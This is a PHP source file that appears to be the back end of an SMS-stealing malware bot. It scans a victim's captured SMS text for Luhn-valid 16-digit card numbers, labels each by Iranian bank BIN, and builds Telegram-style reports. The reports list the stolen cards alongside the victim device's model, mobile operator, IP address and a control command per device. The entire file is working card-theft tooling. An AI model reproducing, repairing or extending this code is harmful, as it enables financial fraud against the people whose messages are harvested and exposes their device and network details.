<?php

function processCards($file_path, $model, $operator, $ip, $device_id) {
    if (!file_exists($file_path) || filesize($file_path) < 10) {
        return generateOfflineMessage($model, $operator, $ip, $device_id);
    }
    
    $content = file_get_contents($file_path);
    if (empty($content) || strlen($content) < 20) {
        return generateNoCardMessage($model, $operator, $ip, $device_id);
    }
    
    $cards = extractAllCardsFast($content);
    
    if (empty($cards)) {
        return generateNoCardMessage($model, $operator, $ip, $device_id);
    }
    
    $unique_cards = array_values(array_unique($cards));
    $card_count = count($unique_cards);
    
    if ($card_count > 40) {
        $unique_cards = array_slice($unique_cards, 0, 40);
    }
    
    return generateCardResult($unique_cards, $model, $operator, $ip, $device_id, $card_count);
}

function extractAllCardsFast($content) {
    $all_cards = [];
    
    preg_match_all('/\b(\d{16})\b/', $content, $matches);
    foreach ($matches[1] as $card) {
        if (strlen($card) === 16 && isValidLuhnFast($card)) {
            $all_cards[] = $card;
        }
    }
    
    preg_match_all('/\b(\d{4}[- ]\d{4}[- ]\d{4}[- ]\d{4})\b/', $content, $matches2);
    foreach ($matches2[1] as $card) {
        $clean = preg_replace('/[^0-9]/', '', $card);
        if (strlen($clean) === 16 && isValidLuhnFast($clean)) {
            $all_cards[] = $clean;
        }
    }
    
    preg_match_all('/\b(\d{4}\.\d{4}\.\d{4}\.\d{4})\b/', $content, $matches3);
    foreach ($matches3[1] as $card) {
        $clean = str_replace('.', '', $card);
        if (strlen($clean) === 16 && isValidLuhnFast($clean)) {
            $all_cards[] = $clean;
        }
    }
    
    if (empty($all_cards)) {
        preg_match_all('/\d{4}[\s\-\.]?\d{4}[\s\-\.]?\d{4}[\s\-\.]?\d{4}/', $content, $matches4);
        foreach ($matches4[0] as $card) {
            $clean = preg_replace('/[^0-9]/', '', $card);
            if (strlen($clean) === 16 && isValidLuhnFast($clean)) {
                $all_cards[] = $clean;
            }
        }
    }
    
    return $all_cards;
}

function isValidLuhnFast($number) {
    if (strlen($number) !== 16) return false;
    
    $sum = 0;
    $alt = false;
    
    for ($i = strlen($number) - 1; $i >= 0; $i--) {
        $digit = intval($number[$i]);
        if ($alt) {
            $digit *= 2;
            if ($digit > 9) $digit -= 9;
        }
        $sum += $digit;
        $alt = !$alt;
    }
    
    return ($sum % 10) === 0;
}

function getBankInfoFast($bin) {
    static $banks = [
        '603799' => ['Melli', '#Melli'],
        '603770' => ['Keshavarzi', '#Keshavarzi'],
        '603769' => ['Saderat', '#Saderat'],
        '589210' => ['Sepah', '#Sepah'],
        '627648' => ['Saderat', '#Saderat'],
        '627961' => ['SanatMadan', '#SanatMadan'],
        '628023' => ['Maskan', '#Maskan'],
        '627760' => ['PostBank', '#PostBank'],
        '502908' => ['Taavon', '#Taavon'],
        '627412' => ['EghtesadNovin', '#EghtesadNovin'],
        '622106' => ['Parsian', '#Parsian'],
        '502229' => ['Pasargad', '#Pasargad'],
        '639347' => ['Sina', '#Sina'],
        '636214' => ['Ayandeh', '#Ayandeh'],
        '505416' => ['Gardeshgari', '#Gardeshgari'],
        '606256' => ['Mellat', '#Mellat'],
        '621986' => ['Saman', '#Saman'],
        '610433' => ['Mellat', '#Mellat'],
        '627353' => ['Tejarat', '#Tejarat'],
        '585983' => ['Tejarat', '#Tejarat'],
        '589463' => ['Refah', '#Refah'],
        '505801' => ['Kosar', '#Kosar'],
        '639599' => ['Ghavamin', '#Ghavamin'],
        '636949' => ['Hekmat', '#Hekmat'],
        '627488' => ['KarAfarin', '#KarAfarin'],
        '504172' => ['Resalat', '#Resalat'],
        '504706' => ['Shahr', '#Shahr'],
        '505809' => ['Novin', '#Novin'],
        '606373' => ['MehrEqtesad', '#MehrEqtesad'],
        '627884' => ['Asia', '#Asia'],
        '636795' => ['IranZamin', '#IranZamin'],
        '628157' => ['ToseeTaavon', '#ToseeTaavon'],
        '504662' => ['Khavarmiane', '#Khavarmiane'],
        '505785' => ['Ansar', '#Ansar'],
        '507673' => ['Ayandeh', '#Ayandeh'],
    ];
    
    return isset($banks[$bin]) ? $banks[$bin] : ['Unknown', '#Unknown'];
}

function generateCardResult($cards, $model, $operator, $ip, $device_id, $count) {
    $result = "💳 <b>Cards Extracted Successfully : </b>\n\n";
    $result .= "─────────────────────\n";
    $result .= "📊 <b>Total Cards</b> ➞ $count\n";
    $result .= "─────────────────────\n\n";
    
    $limit = min(count($cards), 30);
    
    for ($i = 0; $i < $limit; $i++) {
        $card = $cards[$i];
        $bin = substr($card, 0, 6);
        $bank = getBankInfoFast($bin);
        
        $result .= "🏦 ʙᴀɴᴋ : <b>" . $bank[0] . "</b>\n";
        $result .= "💳 ᴄᴀʀᴅ : <code>" . $card . "</code>\n";
        $result .= "─────────────────────\n\n";
    }
    
    if ($count > $limit) {
        $result .= "│ ⚠️ +" . ($count - $limit) . " more cards\n";
    }
    
    $result .= "📱 <b>Model</b> ➞ $model\n";
    $result .= "🛜 <b>Operator</b> ➞ $operator\n";
    $result .= "🌐 <b>IP</b> ➞ $ip\n";
    $result .= "👤 <b>User</b> ➞ /set_$device_id\n\n";
    $result .= "👁 <b>| smoke</b>";
    
    return $result;
}

function generateNoCardMessage($model, $operator, $ip, $device_id) {
    $result = "⚠️ <b>No Valid Cards Found</b>\n";
    $result .= "┌─────────────────────\n";
    $result .= "│❌ <b>Reason</b> ➞ No cards in SMS\n";
    $result .= "└─────────────────────\n\n";
    $result .= "┌─────────────────────\n";
    $result .= "│📱 <b>Model</b> ➞ $model\n";
    $result .= "│🛜 <b>Operator</b> ➞ $operator\n";
    $result .= "│🌐 <b>IP</b> ➞ $ip\n";
    $result .= "│👤 <b>User</b> ➞ /set_$device_id\n";
    $result .= "└─────────────────────\n\n";
    $result .= "👁 <b>| smok</b>";
    return $result;
}

function generateOfflineMessage($model, $operator, $ip, $device_id) {
    $result = "⛔ <b>User Is Offline</b>\n";
    $result .= "┌─────────────────────\n";
    $result .= "│📡 <b>Status</b> ➞ Offline\n";
    $result .= "└─────────────────────\n\n";
    $result .= "┌─────────────────────\n";
    $result .= "│📱 <b>Model</b> ➞ $model\n";
    $result .= "│🛜 <b>Operator</b> ➞ $operator\n";
    $result .= "│🌐 <b>IP</b> ➞ $ip\n";
    $result .= "│👤 <b>User</b> ➞ /set_$device_id\n";
    $result .= "└─────────────────────\n\n";
    $result .= "👁 <b>| smok</b>";
    return $result;
}
?>